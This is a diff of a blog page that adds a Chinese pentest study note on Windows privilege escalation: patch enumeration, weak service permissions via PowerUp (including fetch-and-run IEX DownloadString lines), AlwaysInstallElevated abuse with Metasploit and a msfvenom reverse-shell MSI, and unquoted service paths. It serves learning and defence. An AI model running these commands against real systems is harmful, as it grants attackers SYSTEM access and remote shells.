@@ -131,7 +131,7 @@
             <section class="inner">
                 <section class="inner-main">
                     <div class="post">
-    <article id="post-ckyj2l1it002xrk4z9hqa1p77" class="article article-type-post" itemscope
+    <article id="post-ckys5td5800786c4zbajp7u7c" class="article article-type-post" itemscope
     itemprop="blogPost">
 
     <div class="article-inner">
@@ -200,7 +200,8 @@
 </ul>
 <p>​       例如，在系统A中获取了系统B的权限，这种提权就属于横向提权。常用的提权方法有系统内核溢出漏洞提权、数据库提权、错误的系统配置提权、组策略首选项提权、web中间件漏洞提权、<code>DLL</code>劫持提权、滥用高权限令牌提权、第三方软件/服务提权等。</p>
 <h2 id="4-1-系统内核溢出漏洞提权分析及防范"><a href="#4-1-系统内核溢出漏洞提权分析及防范" class="headerlink" title="4.1 系统内核溢出漏洞提权分析及防范"></a>4.1 系统内核溢出漏洞提权分析及防范</h2><p>​        系统内核溢出漏洞提权是一种通用的提权方法，攻击者通常可以使用该方法绕过系统的所有安全限制。攻击者利用该漏洞的关键是目标系统没有及时安装补丁—即使微软已经针对某个漏洞发布了补丁，但如果系统没有立即安装补丁，就会让攻击者有机可乘。然而，这种提权方法也存在一定的局限性—如果目标系统的补丁更新工作较为迅速和完整，那么攻击者要想通过这种方法提权，就必须找出目标系统中的<code>0day</code>漏洞。</p>
-<h3 id="4-1-1-通过手动执行命令发现缺失补丁"><a href="#4-1-1-通过手动执行命令发现缺失补丁" class="headerlink" title="4.1.1 通过手动执行命令发现缺失补丁"></a>4.1.1 通过手动执行命令发现缺失补丁</h3><pre><code class="hljs powershell"><span class="hljs-comment">#查看当前权限</span>
+<h3 id="4-1-1-通过手动执行命令发现缺失补丁"><a href="#4-1-1-通过手动执行命令发现缺失补丁" class="headerlink" title="4.1.1 通过手动执行命令发现缺失补丁"></a>4.1.1 通过手动执行命令发现缺失补丁</h3><p>WMIC是 “Wmdows Management Instrumentation Command-line” 的缩写WMIC是Windows 平台上最有用的命令行工具。使用WMIC，不仅可以管理本地计算机，还可以管理同一域内的所有计算机（需要一定的权限），而且在被管理的计算机上不必事先安装WMIC。WMIC在信息收集和后渗透测试阶段是非常实用的，可以调取和查看目标机器的进程、服 务、用户、用户组、网络连接、硬盘信息、网络共享信息、已安装的补丁、启动项、已安装的软 件、操作系统的相关信息和时区等。</p>
+<pre><code class="hljs powershell"><span class="hljs-comment">#查看当前权限</span>
 whoami /groups 
 
 <span class="hljs-comment">#查看系统补丁安装信息</span>
@@ -272,13 +273,141 @@ python windows-exploit-suggester.py --database BulletinSearch.xlsx --systeminfo 
 <pre><code class="hljs powershell"><span class="hljs-comment">#1</span>
 <span class="hljs-built_in">Set-ExploitTable</span> <span class="hljs-variable">$MSBulletin</span> <span class="hljs-variable">$VulnStatus</span> 
 <span class="hljs-comment">#2  将所有的1下面加一行2即可</span>
-<span class="hljs-built_in">Write-Host</span> <span class="hljs-variable">$MSBulletin</span> <span class="hljs-variable">$VulnStatus</span>)
+<span class="hljs-built_in">Write-Host</span> <span class="hljs-variable">$MSBulletin</span> <span class="hljs-variable">$VulnStatus</span>
 <span class="hljs-comment">#查找单个漏洞</span>
 <span class="hljs-built_in">Find-MS14058</span></code></pre>
 
+<h3 id="4-1-5-利用一些在线平台"><a href="#4-1-5-利用一些在线平台" class="headerlink" title="4.1.5 利用一些在线平台"></a>4.1.5 利用一些在线平台</h3><p><a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan">https://i.hacking8.com/tiquan</a></p>
+<p><a target="_blank" rel="noopener" href="https://detect.secwx.com/">https://detect.secwx.com/</a></p>
+<p>粘贴补丁号验证是否存在相关漏洞。</p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220118120320067.png" alt="image-20220118120320067"></p>
+<h2 id="4-2-Windows操作系统配置错误利用"><a href="#4-2-Windows操作系统配置错误利用" class="headerlink" title="4.2 Windows操作系统配置错误利用"></a>4.2 Windows操作系统配置错误利用</h2><h3 id="4-2-1-系统服务权限配置错误"><a href="#4-2-1-系统服务权限配置错误" class="headerlink" title="4.2.1 系统服务权限配置错误"></a>4.2.1 系统服务权限配置错误</h3><p>Windows 系统服务文件在操作系统启动时加载和执行，并在后台调用可执行文件。因此，如 果一个<strong>低权限</strong>的用户对此类系统服务调用的可执行文件<strong>拥有写权限</strong>，就可以将该文件替换成任意可执行文件，并随着系统服务的启动获得系统权限。</p>
+<p>Windows服务是以System权限运行的，因 此，其文件夹、文件和注册表键值都是受强访问控制机制保护的，但是，在某些情况下，操作系统中仍然存在—些没有得到有效保护的服务。  </p>
+<p>系统服务权限配置错误（可写目录漏洞）有如下两种可能：</p>
+<ul>
+<li><p>服务未运行：</p>
+<p>攻击者会使用任意服务替换原来的服务，然后重启服务。 </p>
+</li>
+<li><p>服务正在运行且无法被终止：</p>
+<p>这种情况符合绝大多数的漏洞利用场景，攻击者通常会利用 DLL劫持技术并尝试重启服务来提权。</p>
+</li>
+</ul>
+<h4 id="1-PowerUp"><a href="#1-PowerUp" class="headerlink" title="1. PowerUp"></a>1. PowerUp</h4><pre><code class="hljs powershell"><span class="hljs-comment">#本地导入执行</span>
+powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;&amp; &#123;Import-Module .\PowerUp.ps1; Invoke-AllChecks&#125;&quot;</span>
 
+<span class="hljs-comment">#远程加载</span>
+powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IEX (New-Object Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#x27;);Invoke-AllChecks&quot;</span>
 
-<h2 id="4-2-Windows操作系统配置错误利用"><a href="#4-2-Windows操作系统配置错误利用" class="headerlink" title="4.2 Windows操作系统配置错误利用"></a>4.2 Windows操作系统配置错误利用</h2><h3 id="4-2-1-系统服务权限配置错误"><a href="#4-2-1-系统服务权限配置错误" class="headerlink" title="4.2.1 系统服务权限配置错误"></a>4.2.1 系统服务权限配置错误</h3><h3 id="4-2-2-注册表键AlwaysInstallerElevated"><a href="#4-2-2-注册表键AlwaysInstallerElevated" class="headerlink" title="4.2.2 注册表键AlwaysInstallerElevated"></a>4.2.2 注册表键AlwaysInstallerElevated</h3><h3 id="4-2-3-可信任的服务器路径漏洞"><a href="#4-2-3-可信任的服务器路径漏洞" class="headerlink" title="4.2.3 可信任的服务器路径漏洞"></a>4.2.3 可信任的服务器路径漏洞</h3><h3 id="4-2-4-自动安装配置文件"><a href="#4-2-4-自动安装配置文件" class="headerlink" title="4.2.4 自动安装配置文件"></a>4.2.4 自动安装配置文件</h3><h3 id="4-2-5-计划任务"><a href="#4-2-5-计划任务" class="headerlink" title="4.2.5 计划任务"></a>4.2.5 计划任务</h3><h3 id="4-2-6-Empire-内置模块"><a href="#4-2-6-Empire-内置模块" class="headerlink" title="4.2.6 Empire 内置模块"></a>4.2.6 Empire 内置模块</h3><h2 id="4-3-组策略首选项提权分析及防范"><a href="#4-3-组策略首选项提权分析及防范" class="headerlink" title="4.3 组策略首选项提权分析及防范"></a>4.3 组策略首选项提权分析及防范</h2><h2 id="4-4-绕过UAC-提权分析及防范"><a href="#4-4-绕过UAC-提权分析及防范" class="headerlink" title="4.4 绕过UAC 提权分析及防范"></a>4.4 绕过UAC 提权分析及防范</h2><h2 id="4-5-令牌窃取分析及防范"><a href="#4-5-令牌窃取分析及防范" class="headerlink" title="4.5 令牌窃取分析及防范"></a>4.5 令牌窃取分析及防范</h2><h2 id="4-6-无凭证条件下的权限分析及防范"><a href="#4-6-无凭证条件下的权限分析及防范" class="headerlink" title="4.6 无凭证条件下的权限分析及防范"></a>4.6 无凭证条件下的权限分析及防范</h2>
+<span class="hljs-comment">#本地下载执行</span>
+powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IEX (New-Object Net.Webclient).DownloadString(&#x27;C:\PowerUp.ps1&#x27;);Invoke-AllChecks&quot;</span></code></pre>
+
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220119221206512.png" alt="image-20220119221206512"></p>
+<p><code>PowerUp</code> 列出了可能存在问题的所有服务，并在 <code>AbuseFunction</code> 部分直接给出了 利用方式。在这里检测出存在<code>ADWS</code>服务漏洞，Path值为该服务的可执行程序的路径。</p>
+<pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IEX (New-Object Net.Webclient).DownloadString(&#x27;.\PowerUp.ps1&#x27;);&quot;</span><span class="hljs-built_in">Invoke-ServiceAbuse</span> <span class="hljs-literal">-ServiceName</span> <span class="hljs-string">&quot;ADWS&quot;</span> hacker <span class="hljs-literal">-Password</span> Passw0<span class="hljs-built_in">rd</span></code></pre>
+
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220119221841489.png" alt="image-20220119221841489"></p>
+<h4 id="2-MetaSploit"><a href="#2-MetaSploit" class="headerlink" title="2. MetaSploit"></a>2. MetaSploit</h4><p>对应的利用模块是service_permissions。选择 “AGGRESSIVE” 选项，可以利用目标机器上每-个有缺陷的服务。该选项被禁用时，该模块在第一次提权成功后就会停止工作。</p>
+<p>service_permissions 模块使用两种方法来获得System权限：</p>
+<ul>
+<li>如果<code>meterpreter</code>以管理员权限运行，该模块会尝试创建并运行一个新的服务；</li>
+<li>如果当前权限不允许创建服务，该模块会判断哪些 服务的文件或者文件夹的权限有问题，并允许对其进行劫持。在创建服务或者劫持已经存在的服务时，该模块会创建—个可执行程序，其文件名和安装路径都是随机的。</li>
+</ul>
+<p>执行 “run” 命令，会自动反弹—个新的meterpreter（System权限）。</p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220122153058605.png" alt="image-20220122153058605"></p>
+<h3 id="4-2-2-注册表键AlwaysInstallElevated"><a href="#4-2-2-注册表键AlwaysInstallElevated" class="headerlink" title="4.2.2 注册表键AlwaysInstallElevated"></a>4.2.2 注册表键<code>AlwaysInstallElevated</code></h3><p>注册表键<code>AlwaysInstallElevated</code>是—个策略设置项。windows允许低权限用户以System权限运行安装文件。如果启用此策略设置项，那么任何权限的用户都能以 <code>NTAUTHORITY\SYSTEM</code>权限来安装恶意的<code>MSI(MicrosoRWindowsInstaller)</code>文件。</p>
+<h4 id="1-PathsAlwaysInstallElevated-漏洞产生的原因"><a href="#1-PathsAlwaysInstallElevated-漏洞产生的原因" class="headerlink" title="1. PathsAlwaysInstallElevated 漏洞产生的原因"></a>1. <code>PathsAlwaysInstallElevated</code> 漏洞产生的原因</h4><p>​        原因：用户开启了<code>WindowsInstaller</code>特权安装功能</p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220122154749267.png" alt="image-20220122154749267"></p>
+<p>在 “运行” 设置框中输入 “gpedit.msc”，打开组策略编辑器。</p>
+<ul>
+<li>组策略一计算机配置—管理模板—Windows 组件—Windows Installer—永远以高特权进行<br>安装：选择启用。</li>
+<li>组策略—用户配置—管理模板一Windows 组件—Windows Installer—永远以高特权进行安<br>装：选择启用。</li>
+</ul>
+<p>设置完毕，会在注册表的以下两个位置自动创建键值“1”。</p>
+<ul>
+<li><code>HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstall Elevated</code></li>
+<li><code>HKEY LOCAL MACHINE\SOFTWARE\Policies Microsoft\Windows\Installer\AlwaysInstall Elevated</code></li>
+</ul>
+<pre><code class="hljs powershell">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre>
+
+<h4 id="2-Windows-Installer-的相关知识点"><a href="#2-Windows-Installer-的相关知识点" class="headerlink" title="2. Windows Installer 的相关知识点"></a>2. Windows Installer 的相关知识点</h4><p>​    Windows Installer 是 Windows操作系统的组件之一，专门用来管理和配置软件服务。Windows Installer除了是一个安装程序，还用于管理软件的安装、管理软件组件的添加和删除、监视文件的还原、通过回滚进行灾难恢复等。<br>​    Windows Installer 分为客户端安装服务（Msiexec.exe）和MSI文件两部分，它们是一起工作的。Windows Installer 通过 Msiexec.exe 安装 MSI 文件包含的程序。MSI 文件是 Windows Installer的数据包，它实际上是一个数据库，包含安装和卸载软件时需要使用的大量指令和数据。Msiexec.exe 用于安装 MSI文件，一般在运行Microsoft Update 安装更新或者安装一些软件的时候使用，占用内存较多。简单地说，双击 MSI文件就会运行Msiexec.exe。</p>
+<h4 id="3-PowerUp下的实战利用"><a href="#3-PowerUp下的实战利用" class="headerlink" title="3. PowerUp下的实战利用"></a>3. PowerUp下的实战利用</h4><p>在这里，可以使用PowerUp的<code>Get-RegistryAlwaysInstallElevated</code>模块来检查注册表键是否被设置。如果<code>AlwaysInstallElevated</code>注册表键已经被设置，就意味着MSI文件是以System权限运行的。运行该模块的命令如下，“True”表示已经设置。</p>
+<pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IEX (New-Object Net.Webclient).DownloadString(&#x27;.\PowerUp.ps1&#x27;);&quot;</span><span class="hljs-built_in">Get-RegistryAlwaysInstallElevated</span></code></pre>
+
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220122163617342.png" alt="image-20220122163617342"></p>
+<p>添加用户，运行<code>Write-UserAddMSI</code>模块，生成MSI文件并执行。</p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220122164437187.png" alt="image-20220122164437187"></p>
+<p>msiexec 参数解释：</p>
+<pre><code class="hljs powershell">安装选项
+	&lt;/package | /i&gt; &lt;Product.msi&gt;
+		安装或配置产品
+	/a &lt;Product.msi&gt;
+		管理安装 - 在网络上安装产品
+	/j&lt;u|m&gt; &lt;Product.msi&gt; [/<span class="hljs-type">t</span> &lt;<span class="hljs-type">Transform</span> <span class="hljs-type">List</span>&gt;] [/<span class="hljs-type">g</span> &lt;<span class="hljs-type">Language</span> <span class="hljs-type">ID</span>&gt;]
+		公布产品 - m 公布到所有用户，u 公布到当前用户
+	&lt;/uninstall | /x&gt; &lt;Product.msi | ProductCode&gt;
+		卸载产品
+显示选项
+	/quiet
+		安静模式，无用户交互
+	/passive
+		无人参与模式 - 只显示进度栏
+	/q[<span class="hljs-type">n</span>|<span class="hljs-type">b</span>|<span class="hljs-type">r</span>|<span class="hljs-type">f</span>]
+		设置用户界面级别
+		n - 无用户界面
+		b - 基本界面
+		<span class="hljs-built_in">r</span> - 精简界面
+		f - 完整界面(默认值)
+更新选项
+	/update &lt;Update1.msp&gt;[;<span class="hljs-type">Update2.msp</span>]
+		应用更新
+	/uninstall &lt;PatchCodeGuid&gt;[;<span class="hljs-type">Update2.msp</span>] /package &lt;Product.msi | ProductCode&gt;
+		删除产品的更新</code></pre>
+
+<h4 id="4-MetaSploit模块always-install-elevated"><a href="#4-MetaSploit模块always-install-elevated" class="headerlink" title="4. MetaSploit模块always_install_elevated"></a>4. MetaSploit模块<code>always_install_elevated</code></h4><pre><code class="hljs shell">use exploit/windows/local/always_install_elevated
+set LHOST 192.168.2.6
+set SESSION 1
+run</code></pre>
+
+<p>​        <img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220122174614476.png" alt="image-20220122174614476"></p>
+<h4 id="5-用Msi-Wrapper生成msi文件进行提权"><a href="#5-用Msi-Wrapper生成msi文件进行提权" class="headerlink" title="5. 用Msi Wrapper生成msi文件进行提权"></a>5. 用Msi Wrapper生成msi文件进行提权</h4><p>该软件的主要作用就是将<code>exe</code>转化为<code>msi</code>文件，下载地址：<a target="_blank" rel="noopener" href="https://www.exemsi.com/download/">https://www.exemsi.com/download/</a></p>
+<p>使用<code>MSFvenom</code>生成 <code>exec</code> 木马，之后再使用<code>MSI Wrapper</code> 进行打包为 <code>MSI</code>。</p>
+<pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.6 LPORT=4444 -f exe-only &gt;3.exe</code></pre>
+
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220122181831460.png" alt="image-20220122181831460"></p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220122181946241.png" alt="image-20220122181946241"></p>
+<p>创建一个新的upgrade code 继续下一步即可，最终生成MSI的文件，运行即可上线，权限直接为SYSTEM。</p>
+<pre><code class="hljs powershell">msiexec /qn /i <span class="hljs-number">3</span>.msi</code></pre>
+
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220122182732528.png" alt="image-20220122182732528"></p>
+<h4 id="6-利用MSFvenom"><a href="#6-利用MSFvenom" class="headerlink" title="6. 利用MSFvenom"></a>6. 利用MSFvenom</h4><p>生成msi文件：</p>
+<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> kali执行</span>
+msfvenom -p windows/exec CMD=calc.exe -f msi &gt; calc.msi
+<span class="hljs-meta">#</span><span class="bash"> 目标机器运行查看权限为SYSTEM</span>
+msiexec  /qn /i calc.msi
+tasklist /v | findstr &quot;calc.exe&quot;</code></pre>
+
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220122180904998.png" alt="image-20220122180904998"></p>
+<h3 id="4-2-3-可信任的服务器路径漏洞"><a href="#4-2-3-可信任的服务器路径漏洞" class="headerlink" title="4.2.3 可信任的服务器路径漏洞"></a>4.2.3 可信任的服务器路径漏洞</h3><p>​        可信任服务路径（包含空格且没有引号的路径）漏洞利用了 Windows 文件路径解析的特性，并涉及服务路径的文件/文件夹权限（存在缺陷的服务程序利用了属于可执行文件的文件/文件夹的权限）。如果一个服务调用的可执行文件没有正确地处理所引用的完整路径名，这个漏洞就会被攻击者用来上传任意可执行文件。也就是说，如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就是有漏洞的。</p>
+<p>该漏洞存在如下两种可能性:</p>
+<ul>
+<li>如果路径与服务有关，就任意创建一个服务或者编译Service模板。</li>
+<li>如果路径与可执行文件有关，就任意创建一个可执行文件。</li>
+</ul>
+<h4 id="1-Trusted-Service-Paths-漏洞产生的原因"><a href="#1-Trusted-Service-Paths-漏洞产生的原因" class="headerlink" title="1. Trusted Service Paths 漏洞产生的原因"></a>1. Trusted Service Paths 漏洞产生的原因</h4><p>​        因为 Windows 服务通常都是以System 权限运行的，所以系统在解析服务所对应的文件路径中的空格时，也会以系统权限进行。例如，有一个文件路径<code>C:\Program Files\Some Folder\Service.exe</code>。对于该路径中的每一个空格，Windows都会尝试寻找并执行与空格前面的名字相匹配的程序。操作系统会对文件路径中空格的所有可能情况进行尝试，直至找到一个能够匹配的程序。</p>
+<p>例如：</p>
+<ul>
+<li><code>C:\Program.exe</code></li>
+<li><code>C:\ProgramFiles\Some.exe</code></li>
+<li><code>C:\ProgramFiles\SomeFolder\Service.exe</code></li>
+</ul>
+<p>因此，如果一个被 “<strong>适当</strong>” 命名的可执行程序被上传到受影响的目录中，服务一旦重启，该程序就会以System 权限运行（在大多数情况下）。</p>
+<h4 id="2-MetaSploit模块trusted-service-path"><a href="#2-MetaSploit模块trusted-service-path" class="headerlink" title="2. MetaSploit模块trusted_service_path"></a>2. MetaSploit模块<code>trusted_service_path</code></h4><p>​        使用<code>WMIC</code>进行漏洞检测，<strong>服务所对应的路径没有被引号引起来，且路径中包含空格</strong>：</p>
+<pre><code class="hljs powershell"><span class="hljs-comment"># 这个只是粗略筛选，服务路径是否包含空格还要自行判断</span>
+wmic service get name,displayname,pathname,startmode |findstr /i <span class="hljs-string">&quot;Auto&quot;</span> | findstr /i /v <span class="hljs-string">&quot;C:\Windows\\&quot;</span> | findstr /i /v <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span></code></pre>
+
+<p>195</p>
+<h3 id="4-2-4-自动安装配置文件"><a href="#4-2-4-自动安装配置文件" class="headerlink" title="4.2.4 自动安装配置文件"></a>4.2.4 自动安装配置文件</h3><h3 id="4-2-5-计划任务"><a href="#4-2-5-计划任务" class="headerlink" title="4.2.5 计划任务"></a>4.2.5 计划任务</h3><h3 id="4-2-6-Empire-内置模块"><a href="#4-2-6-Empire-内置模块" class="headerlink" title="4.2.6 Empire 内置模块"></a>4.2.6 Empire 内置模块</h3><h2 id="4-3-组策略首选项提权分析及防范"><a href="#4-3-组策略首选项提权分析及防范" class="headerlink" title="4.3 组策略首选项提权分析及防范"></a>4.3 组策略首选项提权分析及防范</h2><h3 id="4-3-1-组策略首选项提权简介"><a href="#4-3-1-组策略首选项提权简介" class="headerlink" title="4.3.1 组策略首选项提权简介"></a>4.3.1 组策略首选项提权简介</h3><h3 id="4-3-2-组策略首选项提权分析"><a href="#4-3-2-组策略首选项提权分析" class="headerlink" title="4.3.2 组策略首选项提权分析"></a>4.3.2 组策略首选项提权分析</h3><h3 id="4-4-3-针对组策略首选项提权的防御"><a href="#4-4-3-针对组策略首选项提权的防御" class="headerlink" title="4.4.3 针对组策略首选项提权的防御"></a>4.4.3 针对组策略首选项提权的防御</h3><h2 id="4-4-绕过UAC-提权分析及防范"><a href="#4-4-绕过UAC-提权分析及防范" class="headerlink" title="4.4 绕过UAC 提权分析及防范"></a>4.4 绕过UAC 提权分析及防范</h2><h3 id="4-4-1-UAC简介"><a href="#4-4-1-UAC简介" class="headerlink" title="4.4.1 UAC简介"></a>4.4.1 UAC简介</h3><h3 id="4-4-2-BypassUAC-模块"><a href="#4-4-2-BypassUAC-模块" class="headerlink" title="4.4.2 BypassUAC 模块"></a>4.4.2 BypassUAC 模块</h3><h3 id="4-4-3-RunAs-模块"><a href="#4-4-3-RunAs-模块" class="headerlink" title="4.4.3 RunAs 模块"></a>4.4.3 RunAs 模块</h3><h3 id="4-4-4-Nishang-中的Invoke-PsUACme"><a href="#4-4-4-Nishang-中的Invoke-PsUACme" class="headerlink" title="4.4.4 Nishang 中的Invoke-PsUACme"></a>4.4.4 Nishang 中的Invoke-PsUACme</h3><h3 id="4-4-5-Empire-中的BypassUAC模块"><a href="#4-4-5-Empire-中的BypassUAC模块" class="headerlink" title="4.4.5 Empire 中的BypassUAC模块"></a>4.4.5 Empire 中的BypassUAC模块</h3><h3 id="4-4-6-针对UAC提权的防御分析"><a href="#4-4-6-针对UAC提权的防御分析" class="headerlink" title="4.4.6 针对UAC提权的防御分析"></a>4.4.6 针对UAC提权的防御分析</h3><h2 id="4-5-令牌窃取分析及防范"><a href="#4-5-令牌窃取分析及防范" class="headerlink" title="4.5 令牌窃取分析及防范"></a>4.5 令牌窃取分析及防范</h2><h3 id="4-5-1-令牌窃取"><a href="#4-5-1-令牌窃取" class="headerlink" title="4.5.1 令牌窃取"></a>4.5.1 令牌窃取</h3><h3 id="4-5-2-Rotten-Potato-本地提权分析"><a href="#4-5-2-Rotten-Potato-本地提权分析" class="headerlink" title="4.5.2 Rotten Potato 本地提权分析"></a>4.5.2 Rotten Potato 本地提权分析</h3><h3 id="4-5-3-添加域管理员"><a href="#4-5-3-添加域管理员" class="headerlink" title="4.5.3 添加域管理员"></a>4.5.3 添加域管理员</h3><h3 id="4-5-4-Empire下的令牌窃取"><a href="#4-5-4-Empire下的令牌窃取" class="headerlink" title="4.5.4 Empire下的令牌窃取"></a>4.5.4 Empire下的令牌窃取</h3><h3 id="4-5-5-针对令牌窃取提权的防御分析"><a href="#4-5-5-针对令牌窃取提权的防御分析" class="headerlink" title="4.5.5 针对令牌窃取提权的防御分析"></a>4.5.5 针对令牌窃取提权的防御分析</h3><h2 id="4-6-无凭证条件下的权限分析及防范"><a href="#4-6-无凭证条件下的权限分析及防范" class="headerlink" title="4.6 无凭证条件下的权限分析及防范"></a>4.6 无凭证条件下的权限分析及防范</h2><h3 id="4-6-1-LLMNR-和NetBIOS欺骗攻击的基本概念"><a href="#4-6-1-LLMNR-和NetBIOS欺骗攻击的基本概念" class="headerlink" title="4.6.1 LLMNR 和NetBIOS欺骗攻击的基本概念"></a>4.6.1 LLMNR 和NetBIOS欺骗攻击的基本概念</h3><h3 id="4-6-2-LLMNR和NetBIOS欺骗攻击分析"><a href="#4-6-2-LLMNR和NetBIOS欺骗攻击分析" class="headerlink" title="4.6.2 LLMNR和NetBIOS欺骗攻击分析"></a>4.6.2 LLMNR和NetBIOS欺骗攻击分析</h3>
         </div>
 
     </div>
@@ -301,6 +430,15 @@ python windows-exploit-suggester.py --database BulletinSearch.xlsx --systeminfo 
 
     
 <nav class="article-nav">
+  
+    <a href="/fd778797.html" id="article-nav-newer" class="article-nav-link-wrap">
+      <div class="article-nav-caption">下一篇</div>
+      <div class="article-nav-title">
+        
+          Xray扫描结果整理小脚本分享
+        
+      </div>
+    </a>
   
   
     <a href="/ddad802f.html" id="article-nav-older" class="article-nav-link-wrap">
@@ -403,6 +541,10 @@ python windows-exploit-suggester.py --database BulletinSearch.xlsx --systeminfo 
       <ul>
         
           <li>
+            <a href="/fd778797.html">Xray扫描结果整理小脚本分享</a>
+          </li>
+        
+          <li>
             <a href="/401ba385.html">内网学习笔记4-权限提升分析及防御</a>
           </li>
         
@@ -416,10 +558,6 @@ python windows-exploit-suggester.py --database BulletinSearch.xlsx --systeminfo 
         
           <li>
             <a href="/7209cfed.html">Log4j漏洞内网检测</a>
-          </li>
-        
-          <li>
-            <a href="/f0bfc07b.html">Empire-配置安装和基本使用</a>
           </li>
         
       </ul>
